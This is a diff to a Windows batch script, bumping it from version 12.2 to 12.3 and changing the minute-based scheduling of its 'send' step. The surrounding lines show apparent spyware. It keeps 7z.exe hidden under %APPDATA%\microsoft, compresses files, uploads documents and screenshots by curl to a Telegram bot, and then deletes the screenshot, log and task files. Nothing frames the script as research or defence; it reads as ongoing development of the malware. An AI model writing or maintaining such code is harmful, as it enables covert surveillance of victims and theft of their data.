@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=12.2"
+set "BATCHVERSION=12.3"
 
 
 
@@ -1509,36 +1509,6 @@ echo.
 
 
 
-
-
-
-set "LAST_MIN_SENT_FILE=%temp%\Vb5wECTM7Svr"
-
-
-
-if exist "%LAST_MIN_SENT_FILE%" (
-    set /p LAST_MINUTE_SENT=<"%LAST_MIN_SENT_FILE%"
-) else (
-    set "LAST_MINUTE_SENT=none"
-)
-
-
-
-set "currentMinute1=%time:~3,2%"
-
-
-
-if "%LAST_MINUTE_SENT%"=="%currentMinute1%" (
-    echo Skipping Sending
-    goto CONT
-)
-
-
-
-
-
-
-
 :EVERYMINSEND
 echo :EVERYMINSEND
 echo.
@@ -1547,19 +1517,20 @@ echo.
 
 
 
+set "currentMinute1=%time:~3,2%"
 :EVERY5MIN
-if "%currentMinute%" neq "%lastMinute%" (
-    if "%currentMinute%"=="00" set "CheckSend=1"
-    if "%currentMinute%"=="10" set "CheckSend=1"
-    if "%currentMinute%"=="16" set "CheckSend=1"
-    if "%currentMinute%"=="19" set "CheckSend=1"
-    if "%currentMinute%"=="20" set "CheckSend=1"
-    if "%currentMinute%"=="30" set "CheckSend=1"
-    if "%currentMinute%"=="33" set "CheckSend=1"
-    if "%currentMinute%"=="38" set "CheckSend=1"
-    if "%currentMinute%"=="40" set "CheckSend=1"
-    if "%currentMinute%"=="50" set "CheckSend=1"
-)
+
+
+if "%currentMinute%"=="00" set "CheckSend=1"
+if "%currentMinute%"=="10" set "CheckSend=1"
+if "%currentMinute%"=="16" set "CheckSend=1"
+if "%currentMinute%"=="19" set "CheckSend=1"
+if "%currentMinute%"=="20" set "CheckSend=1"
+if "%currentMinute%"=="30" set "CheckSend=1"
+if "%currentMinute%"=="33" set "CheckSend=1"
+if "%currentMinute%"=="38" set "CheckSend=1"
+if "%currentMinute%"=="40" set "CheckSend=1"
+if "%currentMinute%"=="50" set "CheckSend=1"
 
 
 
@@ -1749,7 +1720,7 @@ echo.
 
 
 if exist "%APPDATA%\microsoft\7z.exe" goto :COMPRESSFILES
-goto NEXT8
+goto NEXT2
 
 
 
@@ -1861,25 +1832,18 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendDocumen
 
 
 
-:NEXT8
-
-
-
 echo Message sent to chat ID %CHAT_ID%
 echo Sent.
-
-set "currentMinute=%time:~3,2%"
-
-set "CheckSend=0"
-set "lastMinute=%currentMinute%"
-
-
 
 
 
 
 
 :NEXT2
+set "currentMinute=%time:~3,2%"
+
+
+
 del /f /q "%USERPROFILE%\Downloads\screenshot.png"
 del /f /q "%LOGFILE1%"
 del /f /q "%TASKS_DATA%"
